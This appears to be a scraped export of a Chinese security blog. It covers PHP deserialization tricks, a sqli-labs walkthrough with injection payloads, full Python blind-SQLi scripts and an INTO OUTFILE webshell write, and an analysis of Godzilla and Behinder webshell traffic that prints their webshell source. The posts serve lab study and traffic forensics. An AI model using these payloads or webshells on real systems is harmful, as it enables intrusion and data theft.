|| true == $emptyStr || true == false){ echo \u0026#34;impossible\u0026#34;; } class A { } $obj = new A(); $arr = array(\u0026#39;\u0026#39;); if (true == 114514 \u0026amp;\u0026amp; true == 0.1 \u0026amp;\u0026amp; true == $obj \u0026amp;\u0026amp; true == $arr \u0026amp;\u0026amp; true == \u0026#34;a\u0026#34; \u0026amp;\u0026amp; true == true ) { echo \u0026#34;true\u0026#34;; } ?\u0026gt; 反序列化中 fast_destruct 绕过 throw 如果在程序结束销毁所有对象之前有throw抛出异常，则无法实现__destruct()函数的触发：\n\u0026lt;?php class User { public $username = \u0026#34;sxc\u0026#34;; public $age = 258; public function __destruct() { print(\u0026#34;successfully bypass throw\u0026#34;); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;} $ser = \u0026#39;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}\u0026#39;; $unser = unserialize($ser); throw new Exception(\u0026#34;you can\u0026#39;t destruct\u0026#34;); 这个程序只会抛出异常，而不会执行__destruct()\n要绕过这个throw需要利用php的fast_destruct特性：\n方式一，删去末尾一个花括号}：$ser = \u0026#39;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;\u0026#39;;\r方式二，修改序列化数字元素个数，将User后的2改为其他值：$ser = \u0026#39;O:4:\u0026#34;User\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}\u0026#39;;\r方式三，先构造形如array($a, 0)的数组，再将最后的i:1改为i:0：$ser = \u0026#39;a:2:{i:0;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}i:0;i:0;}\u0026#39;; \u0026lt;?php class User { public $username = \u0026#34;sxc\u0026#34;; public $age = 258; public function __destruct() { print(\u0026#34;successfully bypass throw\u0026#34;); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;} // $a = new User(); // $ser = serialize(array($a,0)); // print($ser); # a:2:{i:0;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}i:1;i:0;} # $ser = \u0026#39;a:2:{i:0;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}i:0;i:0;}\u0026#39;; # $ser = \u0026#39;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;\u0026#39;; $ser = \u0026#39;O:4:\u0026#34;User\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:3:\u0026#34;sxc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:258;}\u0026#39;; $user = unserialize($ser); throw new Exception(\u0026#34;you can\u0026#39;t destruct\u0026#34;); ?\u0026gt; 参考资料： https://zhuanlan.zhihu.com/p/405838002\n","permalink":"https://blog.w8nn9z.top/posts/web/php/","summary":"","title":"PHP特性以及Bypass"},{"content":"Less-1 1.测试闭合方式，只有单引号闭合会报错，为单引号闭合\n2.查询列数，当order by 4时报错，共3列\n?id=2\u0026#39; order by 3 --+ 3.查询3个字段的输出位置，可知name对应2，password对应3\n?id=-1\u0026#39; union select 1,2,3 --+ 4.查询当前数据库名，为security\n?id=-1\u0026#39; union select 1,database(),3 --+ 5.查询security数据库内所有表名，有emails,referers,uagents,users\n?id=-1\u0026#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ information_schema是MySQL内置的一个虚拟数据库，专门用于存储数据库的元数据信息。元数据是描述数据库结构和对象的数据，例如表名、列名、数据类型、索引、权限等。\n6.获取users表中的敏感信息。查询users表中所有字段名(默认查询的是当前连接数据库)，有id,username,password\n?id=-1\u0026#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 7.查询字段username和password\n?id=-1\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+\rYour Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4\rYour Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 1.测试闭合方式，单双引号都报错，为数字型\n2.只需在Less-1的基础上去掉单引号即可实现同样的注入。查询到username和password\n?id=-1 union select 1,group_concat(username),group_concat(password) from users --+ Less-3 1.测试闭合方式，只有单引号闭合会报错，根据报错信息可知，为单引号+括号闭合\n2.只需在Less-1的基础上在单引号后添加括号即可实现同样的注入。查询到username和password\n?id=-1\u0026#39;) union select 1,group_concat(username),group_concat(password) from users --+ Less-4 1.测试闭合方式，双引号闭合报错，根据报错信息可知，为双引号+括号闭合\n2.只需在Less-3的基础上将单引号改为双引号即可实现同样的注入。查询到username和password\n?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ Less-5 正常查询?id=1返回You are in\u0026hellip;\u0026hellip;\u0026hellip;.. ，查询?id=0则无回显。根据只有查询到内容才有回显的特性，考虑使用布尔盲注\n1.测试闭合方式，单引号闭合\n2.写python脚本实现布尔盲注：\nimport requests import string def databaseQuery(chars,injectionPoint,method,responseJudge,url): database = \u0026#34;\u0026#34; for i in range(1,11): # 假设数据库名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;substr(database(),{i},1)=\u0026#39;{c}\u0026#39; -- \u0026#34; params = {injectionPoint: payload} r = requests.get(url, params=params) if responseJudge in r.text: \u0026#39;\u0026#39;\u0026#39; print(r.text) # 测试payload时使用 print(f\u0026#34;Found char: {c} at position {i}\u0026#34;) break \u0026#39;\u0026#39;\u0026#39; database += c break if database != \u0026#34;\u0026#34;: print(f\u0026#34;Found Database ==\u0026gt; {database}\u0026#34;) else: print(\u0026#34;database searching error\u0026#34;) def tableQuery(chars,injectionPoint,method,responseJudge,url): tables = [] tableName = \u0026#34;\u0026#34; for j in range(0,5): # 假设连接数据库中不超过5个表 for i in range(1,11): # 假设表名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1)=\u0026#39;{c}\u0026#39; -- \u0026#34; params = {injectionPoint: payload} r = requests.get(url, params=params) if responseJudge in r.text: \u0026#39;\u0026#39;\u0026#39; print(r.text) # 测试payload时使用 print(f\u0026#34;Found char: {c} at position {i}\u0026#34;) break \u0026#39;\u0026#39;\u0026#39; tableName += c break tables.append(tableName) tableName = \u0026#34;\u0026#34; if tables != None: print(f\u0026#34;Found Tables ==\u0026gt; {tables}\u0026#34;) else: print(\u0026#34;table searching error\u0026#34;) def columnQuery(chars,injectionPoint,method,tableName,responseJudge,url): columns = [] columnName = \u0026#34;\u0026#34; for j in range(0,6): # 假设选定的表中不超过6个字段 for i in range(1,11): # 假设字段名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;substr((select column_name from information_schema.columns where table_name=\u0026#39;{tableName}\u0026#39; limit {j},1),{i},1)=\u0026#39;{c}\u0026#39; -- \u0026#34; params = {injectionPoint: payload} r = requests.get(url, params=params) if responseJudge in r.text: \u0026#39;\u0026#39;\u0026#39; print(r.text) # 测试payload时使用 print(f\u0026#34;Found char: {c} at position {i}\u0026#34;) break \u0026#39;\u0026#39;\u0026#39; columnName += c break columns.append(columnName) columnName = \u0026#34;\u0026#34; if columns != None: print(f\u0026#34;Found columns ==\u0026gt; {columns}\u0026#34;) else: print(\u0026#34;column searching error\u0026#34;) def dataQuery(chars,injectionPoint,method,columnName,tableName,responseJudge,url): datas = [] data = \u0026#34;\u0026#34; for j in range(0,10): # 假设选定的字段中不超过10个数据 for i in range(1,11): # 假设数据内容不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;substr((select {columnName} from {tableName} limit {j},1),{i},1)=\u0026#39;{c}\u0026#39; -- \u0026#34; params = {injectionPoint: payload} r = requests.get(url, params=params) if responseJudge in r.text: \u0026#39;\u0026#39;\u0026#39; print(r.text) # 测试payload时使用 print(f\u0026#34;Found char: {c} at position {i}\u0026#34;) break \u0026#39;\u0026#39;\u0026#39; data += c break datas.append(data) data = \u0026#34;\u0026#34; if datas != None: print(f\u0026#34;Found {columnName} ==\u0026gt; {datas}\u0026#34;) else: print(\u0026#34;data searching error\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: chars = string.ascii_lowercase + string.ascii_uppercase # + string.digits + \u0026#34;_\u0026#34; url = \u0026#34;http://sqlilabs:8989/Less-5/\u0026#34; injectionPoint = \u0026#34;id\u0026#34; # 注入点 method = \u0026#34;\\\u0026#39;\u0026#34; # 单引号,双引号,括号,数字型 responseJudge = \u0026#34;You are in...........\u0026#34; # 根据响应包，判断布尔盲注是否成功 #databaseQuery(chars,injectionPoint,method,responseJudge,url) #tableQuery(chars,injectionPoint,method,responseJudge,url) tableName = \u0026#34;users\u0026#34; # 待查询的表 #columnQuery(chars,injectionPoint,method,tableName,responseJudge,url) columnNames = [\u0026#34;username\u0026#34;,\u0026#34;password\u0026#34;] for columnName in columnNames: dataQuery(chars,injectionPoint,method,columnName,tableName,responseJudge,url) Less-6 布尔盲注\n1.双引号闭合\n2.跑盲注脚本\nLess-7 难点在于获取闭合方式，写个fuzz闭合方式的脚本：\nimport requests def detectClosureMethod(chars, closureMethodLength, param, injectionPoint, url, responseJudge): closureMethod = \u0026#34;\u0026#34; quote = chars[0] parentheses = \u0026#34;\u0026#34; errorExistsNum = 0 for i in range(0,closureMethodLength): # 闭合方式字符长度限制 \u0026#39;\u0026#39;\u0026#39; test = \u0026#34;1\u0026#39;) -- \u0026#34; params = {injectionPoint: test} r = requests.get(url, params) print(r.text) break \u0026#39;\u0026#39;\u0026#39; payload = f\u0026#34;{param}{quote}{parentheses}\u0026#34; + \u0026#34; -- \u0026#34; params = {injectionPoint: payload} r = requests.get(url, params) if responseJudge in r.text: parentheses = parentheses + chars[1] errorExistsNum += 1 else: closureMethod = quote + parentheses parentheses = parentheses + chars[1] return errorExistsNum, closureMethod if __name__ == \u0026#34;__main__\u0026#34;: charsList = [\u0026#34;\\\u0026#39;)\u0026#34;,\u0026#34;\\\u0026#34;)\u0026#34;] closureMethodLength = 4 param = 1 injectionPoint = \u0026#34;id\u0026#34; url = \u0026#34;http://sqlilabs:8989/Less-7/\u0026#34; responseJudge = \u0026#34;error\u0026#34; closureMethod = \u0026#34;\u0026#34; for chars in charsList: errorExistsNum, cM = detectClosureMethod(chars, closureMethodLength, param, injectionPoint, url, responseJudge) if errorExistsNum \u0026gt;= 1 and errorExistsNum \u0026lt; closureMethodLength: closureMethod = cM if closureMethod == \u0026#34;\u0026#34;: print(\u0026#34;Closure Method ==\u0026gt; Numeric Closure\u0026#34;) else: print(f\u0026#34;Closure Method ==\u0026gt; {closureMethod}\u0026#34;) 运行结果：\nClosure Method ==\u0026gt; \u0026#39;)) 能区分查询是否成功的页面基本都可以使用布尔盲注，本题hint所使用的方法outfile则是通过SQL语句向网站写入文件：\n/?id=1\u0026#39;))+UNION+SELECT 1,2,\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34; INTO OUTFILE \u0026#34;/var/www/html/Less-7/info.php\u0026#34;--+ 同理，可以直接写入一句话木马拿shell\nLess-8 单引号闭合+布尔盲注\nLess-9 无论是否查询到数据，是否有语法错误，都只返回一个页面，考虑时间盲注。\nimport requests import string import time def detectClosureMethod(chars, closureMethodLength, param, injectionPoint, url): closureMethod = \u0026#34;\u0026#34; quote = chars[0] parentheses = \u0026#34;\u0026#34; errorExistsNum = 0 for i in range(0,closureMethodLength): # 闭合方式字符长度限制 \u0026#39;\u0026#39;\u0026#39; test = \u0026#34;1\u0026#39;) -- \u0026#34; params = {injectionPoint: test} r = requests.get(url, params) print(r.text) break \u0026#39;\u0026#39;\u0026#39; payload = f\u0026#34;{param}{quote}{parentheses}\u0026#34; + \u0026#34; and sleep(2) -- \u0026#34; params = {injectionPoint: payload} start = time.time() requests.get(url, params) duration = time.time() - start # 获取延时时长 if duration \u0026lt; 2: # 考虑到网络延迟，应该大于2 parentheses = parentheses + chars[1] errorExistsNum += 1 else: closureMethod = quote + parentheses parentheses = parentheses + chars[1] return errorExistsNum, closureMethod def closureMethodFuzz(charsList): closureMethod = \u0026#34;\u0026#34; for chars in charsList: errorExistsNum, cM = detectClosureMethod(chars, closureMethodLength, param, injectionPoint, url) if errorExistsNum \u0026gt;= 1 and errorExistsNum \u0026lt; closureMethodLength: closureMethod = cM if closureMethod == \u0026#34;\u0026#34;: print(\u0026#34;Closure Method ==\u0026gt; Numeric Closure\u0026#34;) else: print(f\u0026#34;Closure Method ==\u0026gt; {closureMethod}\u0026#34;) def timeDatabaseQuery(chars,injectionPoint,method,url): database = \u0026#34;\u0026#34; for i in range(1,11): # 假设数据库名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;if(substr(database(),{i},1)=\u0026#39;{c}\u0026#39;, sleep(2), 0) -- \u0026#34; params = {injectionPoint: payload} start = time.time() requests.get(url, params) duration = time.time() - start # 获取延时时长 if duration \u0026gt; 2: # 考虑到网络延迟，应该大于2 database += c break if database != \u0026#34;\u0026#34;: print(f\u0026#34;Found Database ==\u0026gt; {database}\u0026#34;) else: print(\u0026#34;database searching error\u0026#34;) def timeTableQuery(chars,injectionPoint,method,url): tables = [] tableName = \u0026#34;\u0026#34; for j in range(0,5): # 假设连接数据库中不超过5个表 for i in range(1,11): # 假设表名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;if(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1)=\u0026#39;{c}\u0026#39;, sleep(2), 0) -- \u0026#34; params = {injectionPoint: payload} start = time.time() requests.get(url, params) duration = time.time() - start if duration \u0026gt; 2: tableName += c break tables.append(tableName) tableName = \u0026#34;\u0026#34; if tables != None: print(f\u0026#34;Found Tables ==\u0026gt; {tables}\u0026#34;) else: print(\u0026#34;table searching error\u0026#34;) def timeColumnQuery(chars,injectionPoint,method,tableName,url): columns = [] columnName = \u0026#34;\u0026#34; for j in range(0,6): # 假设选定的表中不超过6个字段 for i in range(1,11): # 假设字段名不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;if(substr((select column_name from information_schema.columns where table_name=\u0026#39;{tableName}\u0026#39; limit {j},1),{i},1)=\u0026#39;{c}\u0026#39;, sleep(2), 0) -- \u0026#34; params = {injectionPoint: payload} start = time.time() requests.get(url, params) duration = time.time() - start if duration \u0026gt; 2: columnName += c break columns.append(columnName) columnName = \u0026#34;\u0026#34; if columns != None: print(f\u0026#34;Found columns ==\u0026gt; {columns}\u0026#34;) else: print(\u0026#34;column searching error\u0026#34;) def timeDataQuery(chars,injectionPoint,method,columnName,tableName,url): datas = [] data = \u0026#34;\u0026#34; for j in range(0,10): # 假设选定的字段中不超过10个数据 for i in range(1,11): # 假设数据内容不超过10个字符 for c in chars: payload = f\u0026#34;1{method}\u0026#34; + \u0026#34; and \u0026#34; + f\u0026#34;if(substr((select {columnName} from {tableName} limit {j},1),{i},1)=\u0026#39;{c}\u0026#39;, sleep(2), 0) -- \u0026#34; params = {injectionPoint: payload} start = time.time() requests.get(url, params) duration = time.time() - start if duration \u0026gt; 2: data += c break datas.append(data) data = \u0026#34;\u0026#34; if datas != None: print(f\u0026#34;Found {columnName} ==\u0026gt; {datas}\u0026#34;) else: print(\u0026#34;data searching error\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: charsList = [\u0026#34;\\\u0026#39;)\u0026#34;,\u0026#34;\\\u0026#34;)\u0026#34;] closureMethodLength = 4 param = 1 injectionPoint = \u0026#34;id\u0026#34; # 注入点 url = \u0026#34;http://sqlilabs:8989/Less-9/\u0026#34; # closureMethodFuzz(charsList) chars = string.ascii_lowercase + string.ascii_uppercase # + string.digits + \u0026#34;_\u0026#34; method = \u0026#34;\\\u0026#39;\u0026#34; # 单引号,双引号,括号,数字型 # timeDatabaseQuery(chars, injectionPoint, method, url) # timeTableQuery(chars, injectionPoint, method, url) tableName = \u0026#34;users\u0026#34; # timeColumnQuery(chars,injectionPoint,method,tableName,url) columnNames = [\u0026#34;username\u0026#34;,\u0026#34;password\u0026#34;] for columnName in columnNames: timeDataQuery(chars,injectionPoint,method,columnName,tableName,url) Less-10 双引号闭合＋时间盲注\nLess-11 ~ Less-16 测试闭合方式，只实现登录可以使用万能密码解决，本质还是注释限制条件：\nuname=admin\u0026#39; -- \u0026amp;passwd=123\runame=qwer114514\u0026amp;passwd=123\u0026#39; or 1 -- 传参方式改成了POST，都可以用时间盲注实现数据的查询\nLess17 页面为一个修改密码的服务，已知存在username：admin，在username框进行注入总是会弹Bug off，考虑是对username进行了check并处理了恶意的注入语句，结合修改密码可能会用到UPDATE，本题注入点选择password\n既然是UPDATE，那就应该没有回显，无法通过正常方式查询数据，考虑使用报错注入：\nuname=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e),1) -- XPATH syntax error: \u0026#39;~security~\u0026#39;\runame=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --\rXPATH syntax error: \u0026#39;~emails,referers,uagents,users\u0026#39; uname=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),0x7e),1) -- XPATH syntax error: \u0026#39;~id,username,password~\u0026#39; UPDATE中不能同时SELECT同一张表，可以创建临时表绕过。updatexml最多输出32字节错误信息，可以用substr：\nuname=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),1,30) from (select * from users) as temp),0x7e),1) -- XPATH syntax error: \u0026#39;~Dumb,Angelina,Dummy,secure,stu~\u0026#39;\runame=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),31,30) from (select * from users) as temp),0x7e),1) -- XPATH syntax error: \u0026#39;~pid,superman,batman,admin,admi~\u0026#39;\runame=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),61,30) from (select * from users) as temp),0x7e),1) -- XPATH syntax error: \u0026#39;~n1,admin2,admin3,dhakkan,admin~\u0026#39;\runame=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),91,30) from (select * from users) as temp),0x7e),1) -- XPATH syntax error: \u0026#39;~4~\u0026#39; password同理\nLess-18 无论如何尝试注入，都无法回显其他页面，尝试先用admin账号登陆，发现回显UA头，考虑登陆成功后的UA注入\n与常规的注入无异，出现该问题的原因是该网站将用户UA头用INSERT INTO写入数据库\n根据报错信息，判断写了三个数据到数据库中：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;127.0.0.1\u0026#39;, \u0026#39;admin\u0026#39;)\u0026#39; at line 1 考虑UA头用报错注入：\nUser-Agent: 1\u0026#39;,updatexml(1,concat(0x7e,database(),0x7e),1),\u0026#39;3\u0026#39;#\r...\rUser-Agent: 1\u0026#39;,updatexml(1,concat(0x7e,(select substr(group_concat(username),1,30) from (select * from users) as temp),0x7e),1),\u0026#39;3\u0026#39;#\r... Less-19 Referer头注入，和UA头注入没什么区别：\nReferer: 1\u0026#39;,updatexml(1,concat(0x7e,database(),0x7e),1)#\r...\rReferer: 1\u0026#39;,updatexml(1,concat(0x7e,(select substr(group_concat(username),1,30) from (select * from users) as temp),0x7e),1)#\r... Less-20 cookie是存储于客户端的，猜测服务器只用SELECT获取cookie的内容，cookie位置联合注入、报错注入等都行\n本题用sqlmap跑一下：\npython sqlmap.py -u http://sqlilabs:8989/Less-20/index.php --level=2 --dbms=MySQL --cookie=\u0026#34;uname=admin*\u0026#34; sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests: --- Parameter: Cookie #1* ((custom) HEADER) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: uname=admin\u0026#39; AND 4655=4655 AND \u0026#39;JNaz\u0026#39;=\u0026#39;JNaz Type: error-based Title: MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: uname=admin\u0026#39; AND GTID_SUBSET(CONCAT(0x716b707171,(SELECT (ELT(4852=4852,1))),0x7171717a71),4852) AND \u0026#39;McXM\u0026#39;=\u0026#39;McXM Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: uname=admin\u0026#39; AND (SELECT 1701 FROM (SELECT(SLEEP(5)))leNW) AND \u0026#39;edxV\u0026#39;=\u0026#39;edxV Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: uname=-2237\u0026#39; UNION ALL SELECT NULL,CONCAT(0x716b707171,0x53445a58764b447852436749794867527a496a4a6f416d496c556d717766747855524f7171797165,0x7171717a71),NULL-- - --- ","permalink":"https://blog.w8nn9z.top/posts/web/sqlilabspage1/","summary":"","title":"sqli-labs page1"},{"content":"tshark的使用 webshell流量 哥斯拉流量 https://github.com/BeichenDream/Godzilla\n分析版本：Godzilla 4.01\n基本配置界面：\nPassword：请求参数名\nKey：计算密钥的md5值，然后取其前16位用于加密过程\n请求配置界面：\n自定义header以及在请求时添加干扰数据\n在 Manage -\u0026gt; GenerateShell 中生成webshell：\n4种payload：\n每种payload都可以选择不同的Encryptor，分析部分以PhpDynamicPayload为例\nphp_xor_base64 webshell：\n\u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\u0026#39;pass\u0026#39;; $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 上传到目标url下后续通过Target即可连上webshell\n尝试执行whoami并用wireshark抓取流量进行分析：\n请求包：\npass=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D 响应包：\n11cd6a8758984163fL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI=6c37ac826a2a04bc 可以发现请求包中是可以获取到密码配置信息的：pass\n所以即使题目流量里没有给出上传的webshell，也可以通过爆破来获取密钥，原因在于响应包中是输出了拼接pass和key后的md5信息的：\necho substr(md5($pass.$key),0,16); // 前16位，本例中为 11cd6a8758984163 echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); // 后16位，本例中为 6c37ac826a2a04bc 真正的执行结果为：\nfL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI= 验证：\n爆破脚本：\nimport hashlib def md5_encode(text): return hashlib.md5(text.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() def crack_key(key, pass_key_hash): Pass = \u0026#34;pass\u0026#34; for k in key: key_hash_16 = md5_encode(k)[:16] # 密钥的md5前16位 hash = md5_encode(Pass + key_hash_16) if pass_key_hash == hash: print(\u0026#34;爆破密钥成功\u0026#34;) print(f\u0026#34;密钥: {k}\u0026#34;) print(f\u0026#34;密钥md5前16位为 {key_hash_16}\u0026#34;) return k print(\u0026#34;密钥爆破失败\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: hash_0_16 = \u0026#34;11cd6a8758984163\u0026#34; hash_16_32 = \u0026#34;6c37ac826a2a04bc\u0026#34; pass_key_hash = hash_0_16 + hash_16_32 # 设置key 爆破字典 with open(\u0026#34;dict.txt\u0026#34;,\u0026#39;r\u0026#39;) as f: key = f.read().split() crack_key(key, pass_key_hash) 根据webshell中的encode逻辑，可以看出只是一个 xor + base64 操作，run函数里面才是真正执行命令的部分，要获取run函数只要修改一下原本的webshell，输出 $payload 即可，里面提到gzip编码输出以及解码输入：\nfunction run($pms){ // ... (其他代码) // *** Gzip 解码输入数据 *** if (canCallGzipDecode()==1\u0026amp;\u0026amp;@isGzipStream($pms)){ $pms=gzdecode($pms); // 这里是关键点之一：对传入参数 $pms 进行 gzdecode } formatParameter($pms); // ... (执行代码) $result=@evalFunc(); // 获取执行结果 // ... (处理 Session 和错误) // *** Gzip 编码输出结果 *** if ($_SES!==null){ /* ... session save ... */ } if (canCallGzipEncode()){ $result=gzencode($result,6); // 这里的关键点之二：对输出结果 $result 进行 gzencode } return $result; } 直接用cyberchef就可以解出命令和执行结果，还要注意根据encode逻辑异或得从key的第二个字符开始：\nphp_eval_xor_base64 webshell：\n\u0026lt;?php eval($_POST[\u0026#34;pass\u0026#34;]); 流量包：\n执行的代码：\n@session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\u0026#39;key\u0026#39;; $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 这里的pass变成了key：\nkey=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D 执行的命令：\n执行结果：\nphp_xor_raw 本质上都是xor，与 php_xor_base64 的区别是没有进行base64编码，从流量中导出参数时需要设置为raw，cyberchef解密时加一层 from hex\nwebshell：\n\u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 流量包：\nASCII -\u0026gt; Raw：\n执行的命令：\n执行结果：\n冰蝎流量 https://github.com/rebeyond/Behinder\n分析版本：Behinder 4.1\n配置界面：\n和哥斯拉不同的是每种加密函数都有对应的解密函数给出，默认密钥 e45e329feb5d925b\n通过生成服务端来获取webshell，还是以php代码为例\ndefault_xor_base64 Encrypt：\nfunction Encrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; for($i=0;$i\u0026lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u0026amp;15]; } $bs=\u0026#34;base64_\u0026#34;.\u0026#34;encode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); return $after; } Decrypt：\nfunction Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $bs=\u0026#34;base64_\u0026#34;.\u0026#34;decode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); 